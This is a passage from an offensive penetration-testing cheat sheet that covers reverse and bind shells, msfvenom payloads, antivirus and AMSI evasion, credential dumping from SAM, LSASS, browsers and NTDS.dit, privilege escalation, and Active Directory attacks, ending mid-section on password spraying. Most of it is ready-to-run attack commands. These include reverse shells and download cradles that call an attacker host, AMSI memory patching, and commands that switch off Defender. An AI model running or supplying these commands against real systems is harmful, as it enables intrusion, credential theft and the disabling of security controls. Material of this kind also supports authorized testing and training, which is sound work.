├── powershell → PowerShell TCP client one-liner
├── none of above → MSFvenom binary upload
└── AV blocking? → Encoded payloads, living off the land
```

### Linux Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/<attacker>/<port> 0>&1

# Netcat with named pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker> <port> > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker>",<port>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"]);'

# PHP
php -r '$sock=fsockopen("<attacker>",<port>);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### Windows Reverse Shells
```powershell
# PowerShell one-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://<attacker>/Invoke-PowerShellTcp.ps1')
```

## 6.1b - Shell Stabilization (Full TTY)
```bash
# Step 1: Spawn PTY (pick one that works)
python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/sh")'
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
vim -c ':!/bin/sh'

# Step 2: Background and configure terminal
# Ctrl+Z to background the shell
stty raw -echo
fg
# Hit Enter twice

# Step 3: Set terminal type and size
export TERM=xterm-256color
stty rows 67 columns 318

# Now tab completion, Ctrl+C, arrow keys, and interactive programs work
```

## 6.1c - Bind Shell (when target can't connect out)
```bash
# Linux
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 > /tmp/f

# Windows PowerShell
powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]1234;$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close();$listener.Stop()"

# Connect to bind shell
nc -nv TARGET 1234
```

## 6.2 - MSFvenom Payloads
```
Decision: Staged vs Stageless?
├── Staged (small, needs handler): linux/x86/shell/reverse_tcp
├── Stageless (large, self-contained): linux/x86/shell_reverse_tcp
└── Naming: /shell/ = staged, _reverse_tcp = stageless
```

**Windows Prominent Exploits:**
```
MS08-067       → RCE (SMB, Windows 2000-2003)
EternalBlue    → MS17-010 (SMB, Windows 7/2008)
BlueKeep       → CVE-2019-0708 (RDP, Windows 2000-2003)
PrintNightmare → CVE-2021-34527 (Print Spooler)
Sigred         → CVE-2020-1350 (DNS, Windows 2003-2019)
SeriousSam     → CVE-2021-36934 (SAM/SYSTEM read)
Zerologon      → CVE-2020-1472 (Netlogon, DC compromise)
```

**Payload Transfer Methods:**
```bash
# Impacket SMB (psexec, wmiexec, smbclient)
smbclient //<target>/C$ -U <user> -p '<pass>' -c "put shell.exe"

# SMB share (attacker)
sudo smbserver.py -smb2support share /path/to/dir
copy \\<attacker>\share\shell.exe C:\Windows\Temp\

# FTP
python3 -m pyftpdlib -p 21 -u user -P pass
ftp <target> → get shell.exe

# HTTP (most reliable)
python3 -m http.server 8080
certutil -urlcache -f http://<attacker>:8080/shell.exe shell.exe
```

```bash
# Linux
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f elf -o shell.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f exe -o shell.exe

# PHP
msfvenom -p php/reverse_php LHOST=<attacker> LPORT=<port> -f raw -o shell.php

# JSP (Tomcat WAR)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f aspx -o shell.aspx

# With encoding (AV evasion)
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# DLL payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f dll -o shell.dll

# MSI payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi -o shell.msi
# Execute: msiexec /q /i shell.msi

# BAT payload (manual)
echo powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')" > shell.bat

# VBS payload
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f vbs -o shell.vbs

# DLL injection (rundll32)
rundll32.exe shell.dll,EntryPoint
```

## 6.2b - AV Evasion Techniques
```
├── Encoding: msfvenom -e x86/shikata_ga_nai -i 5
├── Multiple encoders: -i 5 -e x86/shikata_ga_nai -f raw | msfvenom -e x86/alpha_mixed -i 3
├── Living off the land (LOLBAS):
│   ├── certutil -urlcache -f http://ATTACKER/shell.exe shell.exe
│   ├── mshta http://ATTACKER/shell.hta
│   ├── regsvr32 /s /n /u /i:http://ATTACKER/shell.sct scrobj.dll
│   ├── rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=new%20ActiveXObject("WScript.Shell");o.Run("cmd /c powershell ...");
│   └── Reference: https://lolbas-project.github.io/
├── PowerShell download cradle + IEX (fileless):
│   IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
├── Darkarmour: obfuscated Linux ELF binaries
└── Custom payloads: avoid known signatures
```

### 6.2c - AMSI Bypass (PowerShell)

> AMSI scans content passed to PowerShell/scripting engines. Patch in-memory before running malicious code.

**Classic one-liner (works on un-patched AMSI):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**String-split obfuscation (evades signature on the above):**
```powershell
$a='System.Management.Automation.A';$b='msiUtils'
$c=[Ref].Assembly.GetType("$a$b")
$d=$c.GetField('amsiInitFailed','NonPublic,Static')
$d.SetValue($null,$true)
```

**Memory-patching AMSI.dll (modern):**
```powershell
# Patches AmsiScanBuffer to always return CLEAN
$Win32 = @"
using System;using System.Runtime.InteropServices;
public class Win32 {
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "ScanBuffer")
$p = 0; [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

**Defender disable (requires admin / SYSTEM):**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -ExclusionPath C:\Windows\Temp
```

**Constrained Language Mode (CLM) escape:**
```powershell
# Check mode
$ExecutionContext.SessionState.LanguageMode

# Bypass 1: Downgrade to PowerShell v2 (no CLM)
powershell.exe -version 2
$ExecutionContext.SessionState.LanguageMode   # FullLanguage

# Bypass 2: Runspace from new AppDomain
[System.Management.Automation.Runspaces.Runspace]::DefaultRunspace.SessionStateProxy.LanguageMode = "FullLanguage"

# Bypass 3: Use .NET reflection directly (CLM doesn't block C# / Add-Type via certain paths)
# Or: PowerShdll.dll — execute PowerShell outside powershell.exe (bypasses session policies)
rundll32.exe PowerShdll.dll,main . { iex (iwr -useb http://ATTACKER/shell.ps1) }
```

## 6.3 - Metasploit Workflow
```bash
msfconsole

# Module info before using
info <module>              # Full module description, options, targets
check <module>             # Test if target is vulnerable (safe)

search <service/vulnerability>
use <number>
show options
set RHOSTS <target>
set LHOST <attacker>
exploit

# Persistent options (survive module switches)
setg RHOSTS <target>
setg LHOST <attacker>

# Background session
background
sessions -l
sessions -i <id>

# Filter payloads within msfconsole
grep meterpreter show payloads

# Meterpreter post-exploitation
getuid                     # Current user
sysinfo                    # System info
migrate <PID>              # Move to another process
hashdump                   # Dump SAM hashes
screenshot                 # Capture screen
upload/download            # File transfer
portfwd add -L <lp> -p <rp> -r <target>  # Port forwarding
shell                      # Drop to system shell
load kiwi                  # Load Mimikatz

# Key modules
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/psexec
use exploit/multi/http/tomcat_mgr_upload
use exploit/unix/webapp/wp_admin_shell_upload
use auxiliary/scanner/smb/smb_login

# Database (track hosts/services/creds across session)
msfdb init                 # Initialize PostgreSQL
workspace -a <name>        # Create workspace
db_nmap -sC -sV <target>   # Import scan results
hosts                      # List discovered hosts
services                   # List discovered services
creds                      # List cracked credentials
loot                       # List extracted loot
```

## 6.4 - Listener Setup
```bash
# Netcat
nc -lvnp <port>

# Metasploit handler
use exploit/multi/handler
set PAYLOAD <payload>
set LHOST <attacker>
set LPORT <port>
exploit
```

---

# PHASE 7: POST-EXPLOITATION - CREDENTIAL HARVESTING

## 7.1 - Windows Credential Sources
```
Decision: What access do we have?
├── Local Admin → Dump SAM, LSASS, LSA secrets
├── Domain User → Check Credential Manager, saved creds
├── SYSTEM → Full access to all credential stores
└── Domain Admin → DCSync, NTDS.dit extraction
```

### SAM Database (Local Accounts)
```bash
# Local dump (admin access)
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Transfer via SMB share
sudo smbserver.py -smb2support CompData /tmp/
move sam.save \\<attacker>\CompData

# Offline dump
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Remote dump
netexec smb <target> --local-auth -u <admin> -p '<pass>' --sam
netexec smb <target> --local-auth -u <admin> -p '<pass>' --lsa

# Crack NT hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### LSASS Memory
```bash
# Find PID
tasklist /svc | findstr lsass
Get-Process lsass

# Dump (command line)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full

# Dump (GUI) → Task Manager → lsass → Create dump file

# Extract credentials
pypykatz lsa minidump /path/to/lsass.dmp

# What we get:
# MSV: NT hashes, SHA1 hashes
# WDIGEST: Cleartext passwords (older Windows)
# Kerberos: Tickets, ekeys
# DPAPI: Master keys
```

### Credential Manager
```bash
cmdkey /list
# Saved creds → use with runas /savecred
runas /savecred /user:<domain>\<user> cmd.exe
```

### DPAPI (Chrome, Outlook, RDP saved creds)
```bash
# Chrome
mimikatz # dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect

# Firefox (manual)
# C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\logins.json + key4.db
# Use firefox_decrypt.py or LaZagne

# Edge
# C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

# RDP saved creds
# C:\Users\<user>\AppData\Local\Microsoft\Credentials\

# Automated (all browsers)
.\LaZagne.exe all
```

### Autologon / Winlogon Registry
```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

### GPP / cPasswords in SYSVOL
```bash
# Find cpassword in Group Policy XML files
findstr /S /I cpassword \\<dc>\sysvol\<domain>\policies\*.xml

# Decrypt
gpp-decrypt <cpassword_hash>
# Decrypts to plaintext local admin password

# Linux
smb //<dc>/sysvol -U <user> -c "recurse;prompt OFF;mget *"
grep -rn cpassword /path/to/sysvol/
```

### Unattend.xml / Sysprep Credentials
```bash
# Check these paths (contain base64-encoded admin passwords)
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\sysprep.xml

# Extract and decode
type C:\Windows\Panther\Unattend.xml | findstr /i "password"
# Decode base64 → plaintext password
```

### WiFi Password Extraction
```powershell
netsh wlan show profiles                    # List saved networks
netsh wlan show profile name="<SSID>" key=clear  # Show password
```

### Token Impersonation / Incognito
```powershell
# In Meterpreter
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# In Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords  # Extract all logon creds
```

### NTDS.dit (Domain Accounts)
```bash
# Connect to DC
evil-winrm -i <dc_ip> -u <domain_admin> -p '<pass>'

# Check privileges
net localgroup
net user <username>

# Volume Shadow Copy
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit.save
reg.exe save hklm\system C:\system.save

# Offline dump
secretsdump.py -ntds ntds.dit.save -system system.save LOCAL

# Remote DCSync
secretsdump.py <domain>/<user>:<password>@<dc_ip>
secretsdump.py <domain>/<user>:<password>@<dc_ip> --just-dc-ntlm
```

## 7.2 - Linux Credential Sources
```bash
cat /etc/shadow
cat /etc/passwd
cat /etc/shadow 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

# History
cat ~/.bash_history
cat /home/*/.bash_history

# Config files
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.xml" -exec grep -l "password" {} \; 2>/dev/null

# MySQL
cat ~/.mysql_history
cat /etc/mysql/debian.cnf

# Environment
env
cat /etc/environment
```

## 7.3 - Sensitive File Hunting
```bash
# Windows - CMD
dir /s /b C:\*cred* C:\*secret* C:\*password* C:\*config*
findstr /s /i "password" C:\*.txt C:\*.xml C:\*.ini
dir n:\*cred* /s /b                    # Search network share
findstr /s /i cred n:\*.*             # Search file contents on share

# Windows - PowerShell
Get-ChildItem -Recurse -Path C:\ -Include *cred*,*secret*,*password* -File -ErrorAction SilentlyContinue
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
Get-ChildItem -Recurse -Path N:\ | Select-String "password" -List

# Linux
find / -name "*cred*" -o -name "*secret*" -o -name "*password*" 2>/dev/null
grep -rn "password" /etc/ 2>/dev/null
grep -rn "password" /opt/ 2>/dev/null
grep -rn "password" /var/ 2>/dev/null
grep -rn "password" /var/www/ 2>/dev/null
```

---

# PHASE 8: PRIVILEGE ESCALATION

## 8.1 - Linux PrivEsc

> Run enumeration scripts FIRST, then follow decision tree.
> After finding vector, always verify before exploiting.

### Enumeration Scripts (run first)
```bash
# linPEAS (comprehensive - run first)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# LinEnum (alternative)
./LinEnum.sh -t -s -k keyword

# pspy (monitor processes/cron without root)
./pspy64 -pf -i 1000

# Lynis (system audit)
./lynis audit system
```

### Manual Enumeration
```bash
# Basic info
id; whoami; uname -a; cat /etc/os-release
hostname; ip a; route; cat /etc/resolv.conf

# Sensitive files
cat /etc/passwd; cat /etc/shadow 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
crontab -l; ls -la /var/spool/cron/

# SUID/SGID
find / -user root -perm -4000 -type f 2>/dev/null   # SUID
find / -uid 0 -perm -6000 -type f 2>/dev/null       # SGID

# Capabilities
getcap -r / 2>/dev/null

# Writable files/dirs
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# Sudo version (check for CVEs)
sudo -V

# Defense checks
getenforce 2>/dev/null          # SELinux
aa-status 2>/dev/null           # AppArmor
iptables -L -n 2>/dev/null      # Firewall

# Hash identification ($1$=MD5, $5$=SHA-256, $6$=SHA-512, $y$=yescrypt)
cat /etc/shadow | grep -v ':\*:' | grep -v ':!:' | grep -v ':!!:'
```

### Credential Hunting (do on EVERY box)
```bash
# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
cat ~/.ssh/known_hosts

# History files
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null

# Config files with passwords
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.xml" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.yml" -exec grep -l "password" {} \; 2>/dev/null
grep -rn "password" /etc/ /opt/ /var/www/ 2>/dev/null

# Web app configs
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/configuration.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# Database creds
cat /etc/mysql/debian.cnf 2>/dev/null
cat ~/.my.cnf 2>/dev/null

# Environment variables
env; cat /etc/environment

# Mail/spool
ls -la /var/mail/ /var/spool/mail/ 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
```

### Decision Tree
```
What do we have?
├── sudo -l → GTFOBins for allowed commands
│   └── sudo -l shows (ALL) → direct sudo su
├── SUID binary → Check against GTFOBins
│   └── find / -user root -perm -4000 -type f 2>/dev/null
├── Writable cron script → Inject reverse shell
│   └── Monitor with pspy64 -pf -i 1000
├── Wildcard abuse in cron → tar --checkpoint injection
│   └── echo '---checkpoint=1' > /tmp/--checkpoint=1
├── Writable /etc/passwd → Add root user (openssl passwd -1)
│   └── Or cap_dac_override + vim to edit directly
├── Capabilities → Check all dangerous caps
│   ├── cap_setuid → vim.basic -c ':!sh'
│   ├── cap_dac_override → Modify protected files
│   ├── cap_sys_admin → Mount/namespace abuse
│   └── cap_setgid → Group-based file access
├── PATH abuse → Writable dir in PATH, create fake cmd
│   └── echo '#!/bin/bash\nchmod +s /bin/bash' > /writable/dir/cmd
├── LD_PRELOAD → env_keep+=LD_PRELOAD in sudoers
│   └── gcc -shared -fPIC -o /tmp/pe.so /tmp/pe.c -nostartfiles
├── Shared Object Hijack → Writable RUNPATH, custom .so
│   └── readelf -d binary | grep RUNPATH; ldd binary
├── Python Library Hijack → Writable Python module path
│   └── Check PYTHONPATH, writable site-packages
├── NFS root_squash → Create SUID binary on share
│   └── showmount -e target; mount -t nfs; gcc suid.c; chmod u+s
├── Docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
├── LXD group → lxd init, lxc image import, mount host fs
├── Kernel exploit → searchsploit linux kernel <version>
│   ├── Polkit/Pwnkit (CVE-2021-4034) → pkexec exploit
│   ├── Dirty Pipe (CVE-2022-0847) → kernels 5.8-5.17
│   ├── Baron Samedit (CVE-2021-3156) → sudo heap overflow
│   └── Netfilter CVEs (2021-22555, 2022-25636)
├── Restricted shell escape → rbash/rksh/rzsh bypass
│   ├── command substitution, env vars, shell functions
│   └── ssh -t user@target /bin/bash
├── Logrotate exploit → logrotten (versions 3.8.6-3.18.0)
├── Tmux session hijack → Weak session file permissions
├── Passive traffic capture → tcpdump/net-creds/PCredz
├── Disk group → debugfs on /dev/sdaX
├── ADM group → Read /var/log/ files
└── Kubernetes → kubelet API, token extraction, pod YAML
```

## 8.2 - Windows PrivEsc

> Run WinPEAS first, then follow decision tree.
> Always check protections (Defender, AppLocker) before uploading tools.

### Enumeration Scripts
```powershell
# WinPEAS (comprehensive)
.\winPEASany.exe
.\winPEASany.exe quiet fast

# Seatbelt (security-focused)
.\Seatbelt.exe -group=all -full

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# JAWS
.\jaws-enum.ps1
```

### Manual Enumeration
```powershell
# Situational awareness (do FIRST)
whoami /priv                    # Privileges
whoami /groups                  # Group membership
systeminfo                      # OS version, hotfixes
hostname
ipconfig /all                   # Network interfaces (pivot targets!)
arp -a                          # ARP table
route print                     # Routing table
netstat -ano                    # Listening ports (localhost-only services)

# Protections (determine approach)
Get-MpComputerStatus            # Defender status
Get-AppLockerPolicy -Effective  # AppLocker rules
$ExecutionContext.SessionState.LanguageMode  # PS language mode

# Users and groups
net user
net localgroup
net localgroup administrators
query user                      # Logged-on users

# Services
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
sc query                        # Service status
sc qc <service>                 # Service config (binpath, start type)

# Scheduled tasks
schtasks /query /fo LIST /v

# Registry autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Credential hunting
cmdkey /list
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 2>$null
findstr /SIM /C:"password" C:\Users\*.txt C:\Users\*.xml C:\Users\*.ini C:\Users\*.config 2>$null

# Installed software (third-party vulns)
wmic product get name,version
schtasks /query /fo LIST /v | findstr /i "task"

# Named pipes (misconfigs)
pipelist.exe                    # List all pipes
gci \\.\pipe\                   # PowerShell alternative
accesschk.exe /accepteula -w \pipe\*  # Check pipe permissions
```

### Decision Tree
```
What privileges do we have?
├── SeImpersonatePrivilege → JuicyPotato (≤2016), PrintSpoofer (2019+), GodPotato (newer)
├── SeDebugPrivilege → ProcDump LSASS, Mimikatz sekurlsa::minidump, psgetsystem
├── SeBackupPrivilege → VSS copy, diskshadow, robocopy /B, extract NTDS.dit
├── SeTakeOwnershipPrivilege → takeown + icacls on protected files
├── SeRestorePrivilege → Write to protected locations
├── SeLoadDriverPrivilege → Capcom.sys driver loading → SYSTEM
├── Unquoted Service Path → Insert malicious exe in path
├── Writable Service Binary → Replace with reverse shell
├── Service Misconfig → sc config binpath= (SERVICE_ALL_ACCESS)
├── DLL Hijacking → Find missing DLLs with ProcMonitor, place malicious DLL
├── Always Install Elevated → Malicious MSI (HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer)
├── Stored Credentials → cmdkey /list, Credential Manager, Import-Clixml
├── Scheduled Task → Writable script running as SYSTEM
├── Registry AutoRun → Modify autorun keys (HKLM/HKCU Run)
├── Named Pipe Abuse → Writable pipe, impersonation via pipe
├── DnsAdmins Group → dnscmd /config /serverlevelplugindll → restart DNS
├── Server Operators Group → sc config binpath on DC services
├── Print Operators Group → SeLoadDriverPrivilege → Capcom.sys
├── UAC Bypass → EnableLUA check, SystemPropertiesAdvanced.exe DLL hijack
├── Kernel Exploit → searchsploit windows kernel <version>
│   ├── HiveNightmare (CVE-2021-36934) → icacls check, HiveNightmare.exe
│   ├── PrintNightmare (CVE-2021-34527) → ls \\localhost\pipe\spoolss
│   ├── CVE-2020-0668 → File-move exploit
│   └── SeriousSam (CVE-2021-36934) → SAM/SYSTEM read
├── VHDX/VMDK on shares → Mount-VHD, extract SAM/SYSTEM/SECURITY offline
├── Third-party services → wmic product, localhost-only services, DLL hijack
└── Token Impersonation → potato attacks
```

### Potato Attacks
```bash
# JuicyPotato (Server 2016 and below, needs SeImpersonatePrivilege)
JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c <reverse_shell>" -t *

# PrintSpoofer (Server 2019+, needs SeImpersonatePrivilege)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "<reverse_shell>"

# GodPotato (newer Windows, needs SeImpersonatePrivilege)
GodPotato.exe -cmd "cmd /c <reverse_shell>"
```

### SeDebugPrivilege Abuse
```powershell
# Dump LSASS as current user (if SeDebugPrivilege)
procdump.exe -accepteula -ma lsass.exe C:\lsass.dmp
mimikatz # sekurlsa::minidump C:\lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Get SYSTEM via parent process PID targeting
# psgetsystem.ps1 - targets winlogon/lsass parent PID
```

### SeBackupPrivilege Full Chain
```powershell
# Import SeBackupPrivilege DLLs
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

# Copy SAM/SYSTEM via VSS
diskshadow
DISKSHADOW> set context persistent
DISKSHADOW> add volume c: alias test
DISKSHADOW> create
DISKSHADOW> expose %test% z:
# Then: copy z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Robocopy with backup privilege
robocopy /B C:\Windows\NTDS C:\temp\ntds.dit

# Offline extraction
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### UAC Bypass
```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
# EnableLUA = 1 (UAC enabled)
# ConsentPromptBehaviorAdmin = 5 (default) or 2 (no prompt for admins)

# Bypass (UACME technique 54 - SystemPropertiesAdvanced.exe DLL hijack)
# Only works when admin but not elevated
copy C:\Windows\System32\<target>.dll C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\
# Trigger: run SystemPropertiesAdvanced.exe
```

### DLL Hijacking
```powershell
# Find missing DLLs with ProcMonitor (Process Monitor)
# Filter: Result = NAME NOT FOUND, Path ends in .dll
# Check writable directories in PATH

# Verify writable path
accesschk.exe /accepteula -w "C:\Program Files\Target" Users
# Place malicious DLL in writable path → restart service
```

---

# PHASE 9: ACTIVE DIRECTORY ATTACKS

> Follow sequentially. After each new foothold, restart from Phase 1 on new host.
> All attacks shown from BOTH Linux and Windows where applicable.

---

## 9.1 - INITIAL ACCESS (No Credentials)

### 9.1.1 - LLMNR/NBT-NS Poisoning

**Decision: Is LLMNR/NBT-NS active on network?**
```
├── Yes → Run Responder to capture NetNTLMv2 hashes
│   ├── Crack with hashcat -m 5600
│   └── Use cracked creds for credentialed enumeration
├── SMB Relay possible? → ntlmrelayx.py (no SMB signing)
└── No → Move to password spraying
```

**Linux - Responder:**
```bash
# Passive analysis first
sudo responder -I <interface> -A

# Active poisoning (start in tmux, let run)
sudo responder -I <interface> -wrf
# -w = WPAD, -r = Wredir, -f = Fingerprint

# Logs location
ls /usr/share/responder/logs/
# Format: SMB-NTLMv2-SSP-<IP>.txt

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Windows - Inveigh:**
```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y

# C# version (preferred, maintained)
.\Inveigh.exe
# Press ESC for interactive console
# GET NTLMV2UNIQUE - view captured hashes
# GET NTLMV2USERNAMES - see which users captured
```

### 9.1.2 - SMB NULL Session & LDAP Anonymous Bind

**Check SMB NULL Session:**
```bash
# rpcclient
rpcclient -U '' -N <dc_ip>
rpcclient $> querydominfo
rpcclient $> enumdomusers
rpcclient $> getdompwinfo

# enum4linux
enum4linux -U <dc_ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
enum4linux -P <dc_ip>

# enum4linux-ng
enum4linux-ng -P <dc_ip> -oA output

# CrackMapExec (no creds)
netexec smb <dc_ip> --shares
netexec smb <dc_ip> --users
netexec smb <dc_ip> --pass-pol
netexec smb <dc_ip> -u '' -p '' --rid-brute
```

**Check LDAP Anonymous Bind:**
```bash
# ldapsearch
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# windapsearch
./windapsearch.py --dc-ip <dc_ip> -u "" -U
```

### 9.1.3 - Username Enumeration

**Kerbrute (stealthy - no 4625 events):**
```bash
# User enumeration (doesn't lock accounts)
kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/jsmith.txt

# Combine with LinkedIn scraping
python3 linkedin2username.py -c "Company Name" -d domain.com

# Statistically-likely-usernames from GitHub
# jsmith.txt, jsmith2.txt, etc.
```

### 9.1.4 - Password Policy Enumeration

**Without creds:**
```bash
# rpcclient NULL session
rpcclient -U '' -N <dc_ip>
rpcclient $> getdompwinfo

# enum4linux
enum4linux -P <dc_ip>

# LDAP anonymous
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

**With creds:**
```bash
# CrackMapExec
netexec smb <dc_ip> -u <user> -p '<pass>' --pass-pol

# Windows
net accounts
# or
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```

**Key policy fields:**
```
- Lockout threshold (e.g., 5 attempts)
- Lockout duration (e.g., 30 min)
- Min password length (e.g., 8)
- Password complexity (enabled/disabled)
```

### 9.1.5 - Password Spraying

**Decision: Know lockout policy?**
```
├── Yes → Spray (threshold - 1) passwords, wait lockout_duration between sprays
├── Unknown → 1-2 targeted sprays, wait 1+ hour between
└── No lockout → Full brute force
```

**Target user list sources:**
```
1. SMB NULL session → enumdomusers / enum4linux -U / netexec --users
2. LDAP anonymous → ldapsearch / windapsearch
3. Kerbrute userenum with jsmith.txt
4. LinkedIn scraping → linkedin2username
5. Credentialed → netexec --users (shows badpwdcount)
```

**Filter out near-lockout accounts:**
```bash
# CrackMapExec shows badpwdcount - filter accounts with count > 0
netexec smb <dc_ip> -u <user> -p '<pass>' --users | grep "badpwdcount: 0"
```

**Spray from Linux:**
